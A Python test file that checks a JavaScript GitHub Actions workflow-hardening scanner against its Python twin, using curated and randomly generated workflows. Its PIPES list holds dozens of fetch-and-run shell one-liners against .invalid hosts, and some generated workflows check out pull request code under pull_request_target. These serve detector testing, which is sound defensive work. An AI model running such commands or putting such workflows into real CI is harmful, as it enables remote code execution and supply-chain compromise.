"""Engine parity for the workflow hardening checks (0.1.9, S-2): the npm engine's
js/src/lib/ghworkflow.js `hardening` and `hardeningRule` against
lazaret.scanner.ghworkflow.hardening and hardening_rule.

Compared case by case in one node process, on curated workflows and on seeded
random ones built from the forms each part takes: `uses:` pinned and not (a
full SHA, a tag, a branch, an image with and without a digest, a reusable
workflow, a local path), permissions as a block, a flow mapping, `write-all`,
`read-all` and none, pull_request_target and release events, checkouts with a
`ref:` or a `repository:` from the pull request and the same as git commands,
cache actions and the setup actions' cache inputs, installs with and without
--ignore-scripts, publish commands, scripts fetched and piped into a shell (and the
lookalikes: `curl | jq`, `python -m json.tool`), and scripts with continued lines.
The command helpers (install_command, publish_command, pipe_to_shell) and
logical_lines are compared on their own too. The rule each finding becomes is compared
too (the id, severity, message, reason and fix), and the pattern text and the
lists the twin keeps are checked to be the Python module's own.

All content is inert text: hosts are .invalid, and nothing is executed.
Skipped where node is missing.
"""
import json
import random
import re
import subprocess
import unittest

from lazaret.scanner import ghworkflow
from tests.architecture import test_js_parity as parity
from tests.architecture.test_js_parity_persistence import LIB
from tests.scanner.test_ghworkflow_hardening import ADVERSARIAL_RUNS

NODE = parity.NODE
NPM = """
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
const g = await import(pathToFileURL(process.argv[1] + "/ghworkflow.js").href);
const args = JSON.parse(readFileSync(0, "utf8"));
const texts = args.texts;
const out = {
  twins: g.HARDENING_TWINS,
  cases: texts.slice(0, args.workflows).map((t) => { const found = g.hardening(t); return [found, found.map(([k, , d]) => g.hardeningRule(k, d))]; }),
  commands: texts.slice(args.workflows).map((t) => [g.installCommand(t), g.publishCommand(t), g.pipeToShell(t)]),
  joined: args.groups.map((lines) => g.logicalLines(lines)),
};
process.stdout.write(JSON.stringify(out));
"""

SHA = "0123456789abcdef0123456789abcdef01234567"
DIGEST = "sha256:" + "ab" * 32

CURATED = [
    # an unpinned workflow with write permissions for every job
    "on: push\npermissions:\n  contents: write\n  id-token: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
    "      - uses: actions/checkout@v4\n      - uses: some/thing@main\n      - run: npm ci\n",
    # pinned, read only: nothing to say
    f"on: push\npermissions: read-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@{SHA} # v4\n",
    # a pull_request_target job that checks out the pull request, with and by command
    "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
    "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
    "  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          git fetch origin pull/1/head\n"
    "          git checkout ${{ github.head_ref }}\n",
    # a release that restores caches
    "on:\n  release:\n    types: [published]\npermissions:\n  contents: read\njobs:\n  p:\n    runs-on: ubuntu-latest\n"
    "    steps:\n      - uses: actions/cache@v4\n        with:\n          path: ~/.npm\n"
    "      - uses: actions/setup-node@v4\n        with:\n          cache: npm\n      - uses: actions/setup-go@v5\n"
    "      - uses: actions/setup-node@v4\n      - uses: actions/setup-python@v5\n        with:\n          cache: false\n",
    # an OIDC token, and installs, in the workflow's permissions and in a job's own
    "on: push\npermissions:\n  id-token: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm ci\n"
    "  b:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: npm ci\n"
    "  c:\n    runs-on: ubuntu-latest\n    permissions: {id-token: write, contents: read}\n    steps:\n"
    "      - run: npm ci --ignore-scripts\n      - run: pip install x\n",
    # no permissions at all
    "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n  b:\n    runs-on: ubuntu-latest\n"
    "    permissions: {}\n    steps:\n      - run: echo hi\n",
    # images, reusable workflows, local paths
    f"on: push\npermissions: {{}}\njobs:\n  a:\n    uses: org/repo/.github/workflows/w.yml@v1\n  b:\n    uses: ./.github/workflows/x.yml\n"
    f"  c:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://alpine:3\n      - uses: docker://alpine@{DIGEST}\n"
    f"      - uses: ./local\n      - uses: org/repo/sub@{SHA}\n      - uses: org/repo@{SHA[:39]}\n",
    "", "on: push\n", "jobs:\n", "jobs:\n  a:\n", "- uses: x@v1\n", "permissions: write-all\n",
]


def uses():
    return ["actions/checkout@v4", "actions/checkout@" + SHA, "actions/cache@v4", "actions/cache/restore@" + SHA,
            "actions/setup-node@v4", "actions/setup-python@v5", "actions/setup-go@v5", "actions/setup-java@v4",
            "actions/setup-dotnet@v4", "ruby/setup-ruby@v1", "astral-sh/setup-uv@v5", "Swatinem/rust-cache@v2",
            "github/codeql-action/init@v3", "some/thing@main", "some/thing@" + SHA, "some/thing", "some/thing@",
            "docker://alpine:3", "docker://alpine@" + DIGEST, "docker://alpine@sha256:xyz", "./local", ".", "../x",
            "pypa/gh-action-pypi-publish@release/v1", "softprops/action-gh-release@v2", "org/repo/.github/workflows/w.yml@v1",
            "org/repo@1.2.3", "org/repo@v", "org/repo@V4", "  spaced/action@v1  "]


def withs(rnd):
    c = rnd.choice
    pick = [c(["ref: ${{ github.event.pull_request.head.sha }}", "ref: ${{ github.head_ref }}", "ref: main",
               "ref: refs/pull/${{ github.event.number }}/merge", "ref: ''"]),
            c(["repository: ${{ github.event.pull_request.head.repo.full_name }}", "repository: me/x"]),
            c(["cache: npm", "cache: false", "cache: ''", "enable-cache: false", "enable-cache: true", "bundler-cache: true",
               "package-manager-cache: false", "package-manager-cache: true", "path: ~/.cache"]),
            c(["token: ${{ secrets.T }}", "persist-credentials: false", "node-version: 20"])]
    return rnd.sample(pick, rnd.randint(0, 3))


RUNS = ["npm ci", "npm install", "npm i --ignore-scripts", "pnpm install --frozen-lockfile", "yarn", "yarn install", "yarn;",
        "pip install -r r.txt", "python3 -m pip install x", "uv sync", "poetry install", "cargo build --release", "go build ./...",
        "go mod download", "npm publish", "twine upload dist/*", "gh release create v1", "docker push x", "cargo publish",
        "git checkout ${{ github.event.pull_request.head.sha }}", "git fetch origin refs/pull/1/head", "gh pr checkout 1",
        "gh pr checkout ${{ github.event.number }}", "git fetch origin pull/${{ github.event.number }}/head", "git fetch origin pull/7/merge",
        "echo ${{ github.head_ref }}", "echo hi", "make test", "npm run build && npm ci", "(npm ci)", "yarnpkg", "npm ci;",
        "CI=true npm ci", "A=1 B=x/y npm ci", "sudo pip install x", "if true; then npm ci; fi", "x=$(npm ci)", "a | yarn",
        "echo npm ci", "git commit -m 'npm ci'", "echo do not npm install", "FOO=\"a b\" npm ci", "time cargo build",
        "echo && npm publish", "echo npm publish", "exec twine upload dist/*"]
PIPES = [
    "curl -fsSL https://x.invalid/i.sh | sh", "curl -s https://x.invalid | sudo bash", "wget -qO- https://x.invalid | bash -s -- -y",
    "curl https://x.invalid | python3 -", "curl https://x.invalid | python3 -m json.tool", "bash <(curl -s https://x.invalid)",
    "sh -c \"$(curl -fsSL https://x.invalid)\"", "eval \"$(wget -qO- https://x.invalid)\"", "iwr https://x.invalid | iex",
    "curl https://x.invalid | tee f | sh", "curl -o f https://x.invalid && sh f", "curl https://x.invalid > f; sh f",
    "curl https://x.invalid | jq .a", "curl x.invalid |& bash", ". <(curl https://x.invalid)", "source <(wget -qO- https://x.invalid)",
    "echo curl x | sh", "curl https://x.invalid | env FOO=1 bash", "curl https://x.invalid | /bin/sh", "curl x.invalid | node",
    "curl x.invalid | node -e 'x'", "iex (iwr https://x.invalid)", "Invoke-Expression (New-Object Net.WebClient).DownloadString('x')",
    "curl x.invalid | sudo -E sh", "curl x.invalid | PYTHON=1 python", "curl x.invalid | dash -s", "CURL x.invalid | SH",
    "curl x.invalid | python3 - ", "curl x.invalid | python3 -u -", "curl x.invalid | python3 foo.py", "curl x.invalid | perl",
    "curl x.invalid | ruby -", "curl x.invalid | powershell", "curl x.invalid | pwsh -c -", "curl x.invalid | grep sh",
    "curl x.invalid | head -1 | sh", "git clone x.invalid; sh install.sh", "curl x.invalid || sh", "curl x.invalid && echo | bash",
    "curl x.invalid\n| sh", "if curl x.invalid | sh; then echo; fi", "curl x.invalid | \u0131f", "curl x.invalid | s\u017fh",
    "iex \"$(irm x.invalid)\"", "zsh <(curl x.invalid)", "bash -x <(curl x.invalid)", "bash \"$(wget x.invalid)\"", "sh $(curl x.invalid)",
    "echo $(curl x.invalid) | sh", "curl x.invalid | sh | tee log", "echo \"curl x\" | sh", "sudo curl x.invalid | sh",
    "if curl -fsSL x.invalid | sh; then :; fi", "(curl x.invalid | sh)", "bash -c \"$(curl -fsSL x.invalid)\"",
    "bash -ec '$(curl x.invalid)'", "iex \"& { $(irm https://x.invalid) } -UseMSI\"", "bash -x \"$(curl x.invalid)\"",
    "eval <(curl x.invalid)", "while curl x.invalid | sh; do :; done", "if npm ci; then :; fi", "until npm publish; do :; done",
    "curl a.invalid | wget b.invalid | sh", "curl x.invalid; echo a | sh", "curl x.invalid\necho a | sh",
    "curl x.invalid | FOO=1 BAR=x/y sh", "curl x.invalid | sudo env A=1 sh", "curl x.invalid | env sh", "time curl x.invalid | sh"]
RUNS += PIPES
CONTINUED = [("curl -fsSL https://x.invalid \\", "| sh"), ("npm ci \\", "--ignore-scripts"), ("cargo \\", "build"),
             ("curl https://x.invalid \\", "-o f"), ("echo a \\", "&& curl x.invalid | bash"), ("npm \\", "publish"),
             ("curl x.invalid \\", "")]


def permissions(rnd, pad):
    c = rnd.choice
    return c([
        pad + "permissions: read-all", pad + "permissions: write-all", pad + "permissions: {}",
        pad + "permissions: {contents: write}", pad + "permissions: {id-token: write, contents: read}",
        pad + "permissions:\n" + pad + "  contents: read",
        pad + "permissions:\n" + pad + "  contents: write\n" + pad + "  id-token: write",
        pad + "permissions:\n" + pad + "  id-token: write\n" + pad + "  packages: read",
        pad + "permissions:\n" + pad + "  pull-requests: write"])


def workflow(rnd):
    c = rnd.choice
    on = c(["on: push", "on: pull_request_target", "on: [push, pull_request_target]", "on:\n  release:\n    types: [published]",
            "on:\n  pull_request_target:\n    types: [opened]", "on: workflow_dispatch", "on: pull_request",
            "\"on\":\n  - release", "on: {release: {types: [created]}}"])
    lines = [c(["name: w", "# a workflow", ""]), on]
    if rnd.random() < 0.6:
        lines.append(permissions(rnd, ""))
    lines.append("jobs:")
    for j in range(rnd.randint(1, 3)):
        if rnd.random() < 0.2:
            lines.append(f"  j{j}:\n    uses: {c(uses())}")
            continue
        lines.append(f"  j{j}:")
        lines.append("    runs-on: ubuntu-latest")
        if rnd.random() < 0.4:
            lines.append(permissions(rnd, "    "))
        lines.append("    steps:")
        for _ in range(rnd.randint(1, 5)):
            k = rnd.randrange(5)
            if k in (0, 1):
                lines.append("      - uses: " + c(uses()))
                w = withs(rnd)
                if w:
                    lines.append("        with:\n" + "\n".join("          " + x for x in w))
            elif k == 2:
                lines.append("      - run: " + c(RUNS))
            elif k == 3:
                a, b = c(CONTINUED) if rnd.random() < 0.3 else (c(RUNS), c(RUNS))
                lines.append("      - name: s\n        run: " + c(["|", ">-"]) + "\n          " + a + "\n          " + b)
            else:
                lines.append("      - name: n\n        uses: " + c(uses()) + "\n        with:\n          " + c(withs(rnd) or ["a: b"]))
    return "\n".join(lines) + "\n"


def corpus(seed=20261003, count=1500):
    rnd = random.Random(seed)
    cases = list(CURATED)
    for _ in range(count):
        text = workflow(rnd)
        if rnd.random() < 0.2:                   # cut: malformed files
            k = rnd.randrange(len(text) + 1)
            text = text[:k] + rnd.choice(["", "\n  - ", ": ", "{", "'", "\t"]) + text[k + rnd.randrange(4):]
        if rnd.random() < 0.15:                  # Windows line ends
            text = text.replace("\n", "\r\n")
        cases.append(text)
    return [json.loads(json.dumps(c)) for c in cases]


TIMING = """
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
const g = await import(pathToFileURL(process.argv[1] + "/ghworkflow.js").href);
const runs = JSON.parse(readFileSync(0, "utf8"));
const times = runs.map((run) => {
  const text = `on: pull_request_target\\npermissions:\\n  id-token: write\\njobs:\\n  a:\\n    steps:\\n      - run: ${run}\\n`;
  const start = performance.now();
  g.hardening(text);
  return performance.now() - start;
});
process.stdout.write(JSON.stringify(times));
"""


def groups(seed=7, count=300):
    """Lists of [line, text] as a script gives them: some end in a backslash."""
    rnd = random.Random(seed)
    pieces = ["a", "b \\", "\\", "", "x\\\\", "npm ci \\", "| sh", " ", "curl x.invalid \\"]
    return [[[i + 1, rnd.choice(pieces)] for i in range(rnd.randint(0, 6))] for _ in range(count)]


def core(text):
    found = ghworkflow.hardening(text)
    return [[list(f) for f in found], [ghworkflow.hardening_rule(k, d) for k, _line, d in found]]


@unittest.skipUnless(NODE, "node is not installed")
class HardeningParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.texts = corpus()
        cls.lines = sorted(set(RUNS)) + [l for a, b in CONTINUED for l in (a + " " + b, a[:-1] + " " + b)]
        cls.groups = groups()
        args = {"texts": cls.texts + cls.lines, "workflows": len(cls.texts), "groups": cls.groups}
        p = subprocess.run([NODE, "--input-type=module", "-e", NPM, LIB], input=json.dumps(args),
                           capture_output=True, encoding="utf-8", errors="replace", timeout=40)
        if p.returncode:
            raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
        cls.npm = json.loads(p.stdout)

    def test_findings_and_rules(self):
        bad = []
        for text, got in zip(self.texts, self.npm["cases"]):
            want = json.loads(json.dumps(core(text)))
            if want != got:
                bad.append((text[:400], want, got))
        self.assertEqual(bad[:3], [])
        kinds = [f[0] for found, _rules in self.npm["cases"] for f in found]
        for kind in ("unpinned", "pr-checkout", "cache", "perms", "perms-missing", "oidc-install", "pipe-to-shell"):
            self.assertGreater(kinds.count(kind), 60, kind)

    def test_the_command_helpers(self):
        want = [[ghworkflow.install_command(t), ghworkflow.publish_command(t), ghworkflow.pipe_to_shell(t)] for t in self.lines]
        self.assertEqual(want, self.npm["commands"])
        found = [w[2] for w in want if w[2] is not None]
        self.assertGreater(len(found), 25)                        # the corpus has both: fetches that run, and ones that don't
        self.assertGreater(len(want) - len(found), 40)

    def test_logical_lines(self):
        want = json.loads(json.dumps([ghworkflow.logical_lines([tuple(x) for x in g]) for g in self.groups]))
        self.assertEqual(want, self.npm["joined"])
        self.assertTrue(any(len(w) != len(g) for w, g in zip(want, self.groups)))   # some lines were joined

    def test_the_lists_and_patterns_are_cores(self):
        twins = self.npm["twins"]
        for name, src in twins["patterns"].items():
            rx = getattr(ghworkflow, name)
            self.assertEqual(src, rx.pattern, name)
            self.assertEqual(bool(rx.flags & re.I), name in twins["ignoreCase"], name)   # the only flag a pattern carries
            self.assertFalse(rx.flags & (re.M | re.S | re.X), name)
        for name, value in twins["lists"].items():
            self.assertEqual(value, json.loads(json.dumps(getattr(ghworkflow, name))), name)

    def test_hostile_lines_are_read_in_linear_time(self):
        runs = list(ADVERSARIAL_RUNS())
        p = subprocess.run([NODE, "--input-type=module", "-e", TIMING, LIB], input=json.dumps(runs),
                           capture_output=True, encoding="utf-8", errors="replace", timeout=40)
        self.assertEqual(p.returncode, 0, p.stderr[-1000:])
        slow = [(runs[i][:24], round(t)) for i, t in enumerate(json.loads(p.stdout)) if t > 3000]
        self.assertEqual(slow, [])


if __name__ == "__main__":
    unittest.main()
